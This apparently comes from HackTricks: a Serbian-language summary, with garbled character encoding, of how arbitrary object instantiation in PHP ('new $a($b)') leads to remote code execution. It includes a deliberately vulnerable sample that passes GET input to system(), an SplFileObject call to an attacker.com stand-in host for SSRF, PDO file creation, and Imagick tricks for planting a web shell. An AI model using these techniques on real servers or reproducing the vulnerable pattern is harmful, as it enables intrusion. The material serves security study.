# PHP - RCE zloupotreba kreiranja objekata: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Ovo je u osnovi saÅ¾etak [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Uvod

Kreiranje novih proizvoljnih objekata, kao Å¡to je `new $_GET["a"]($_GET["a"])`, moÅ¾e dovesti do izvrÅ¡avanja udaljenog koda (RCE), kako je detaljno opisano u [**writeup-u**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Ovaj dokument istiÄe razliÄite strategije za postizanje RCE-a.

## RCE putem prilagoÄ‘enih klasa ili automatskog uÄitavanja

Sintaksa `new $a($b)` se koristi za instanciranje objekta gde **`$a`** predstavlja ime klase, a **`$b`** je prvi argument koji se prosleÄ‘uje konstruktoru. Ove promenljive mogu biti dobijene iz korisniÄkog unosa kao Å¡to su GET/POST, gde mogu biti stringovi ili nizovi, ili iz JSON-a, gde mogu biti drugi tipovi.

Razmotrite sledeÄ‡i primer koda:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
U ovom sluÄaju, postavljanje `$a` na `App` ili `App2` i `$b` na sistemsku komandu (npr. `uname -a`) rezultira izvrÅ¡avanjem te komande.

**Funkcije automatskog uÄitavanja** mogu biti iskoriÅ¡Ä‡ene ako nema takvih klasa koje su direktno dostupne. Ove funkcije automatski uÄitavaju klase iz fajlova kada su potrebne i definiÅ¡u se koristeÄ‡i `spl_autoload_register` ili `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
PonaÅ¡anje automatskog uÄitavanja varira sa verzijama PHP-a, nudeÄ‡i razliÄite moguÄ‡nosti RCE-a.

## RCE putem ugraÄ‘enih klasa

Ako nemate prilagoÄ‘ene klase ili autoloadere, **ugraÄ‘ene PHP klase** mogu biti dovoljne za RCE. Broj ovih klasa varira izmeÄ‘u 100 i 200, zavisno od verzije PHP-a i ekstenzija. Mogu se izlistati koristeÄ‡i `get_declared_classes()`.

Konstruktori od interesa mogu se identifikovati kroz reflection API, kao Å¡to je prikazano u sledeÄ‡em primeru i linku [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE putem odreÄ‘enih metoda ukljuÄuje:**

### **SSRF + deserijalizacija Phar**

Klasa `SplFileObject` omoguÄ‡ava SSRF putem svog konstruktora, omoguÄ‡avajuÄ‡i konekcije ka bilo kojem URL-u:
```php
new SplFileObject('http://attacker.com/');
```
SSRF moÅ¾e dovesti do napada deserializacije u verzijama PHP-a prije 8.0 koriÅ¡Ä‡enjem Phar protokola.

### **IskoriÅ¡Ä‡avanje PDO-a**

Konstruktor klase PDO omoguÄ‡ava povezivanje sa bazama podataka putem DSN stringova, Å¡to potencijalno omoguÄ‡ava kreiranje datoteka ili druge interakcije:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Verzije PHP-a do 5.3.22 i 5.4.12 bile su podloÅ¾ne XXE napadima putem konstruktora `SoapClient` i `SimpleXMLElement`, u zavisnosti od verzije libxml2.

## RCE putem Imagick ekstenzije

Analizom **zavisnosti projekta**, otkriveno je da se **Imagick** moÅ¾e iskoristiti za **izvrÅ¡avanje komandi** instanciranjem novih objekata. Ovo pruÅ¾a moguÄ‡nost iskoriÅ¡Ä‡avanja ranjivosti.

### VID parser

Identifikovana je moguÄ‡nost parsera VID-a da piÅ¡e sadrÅ¾aj na bilo koju odreÄ‘enu putanju u fajl sistemu. Ovo moÅ¾e dovesti do postavljanja PHP Å¡el-a u direktorijum koji je dostupan preko web-a, postiÅ¾uÄ‡i izvrÅ¡avanje udaljenog koda (RCE).

#### VID Parser + Slanje fajla

PrimeÄ‡eno je da PHP privremeno Äuva poslate fajlove u `/tmp/phpXXXXXX`. VID parser u Imagick-u, koristeÄ‡i protokol **msl**, moÅ¾e da rukuje dÅ¾okerima u putanjama fajlova, olakÅ¡avajuÄ‡i prenos privremenog fajla na odabranu lokaciju. Ovaj metod pruÅ¾a dodatni pristup za postizanje proizvoljnog pisanja fajlova u fajl sistemu.

### PHP pad + Brute Force

Metod opisan u [**originalnom opisu**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) ukljuÄuje slanje fajlova koji izazivaju pad servera pre brisanja. Brute force-ovanjem naziva privremenog fajla, postaje moguÄ‡e da Imagick izvrÅ¡i proizvoljni PHP kod. MeÄ‘utim, ova tehnika je efikasna samo u zastareloj verziji ImageMagick-a.

## Reference

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
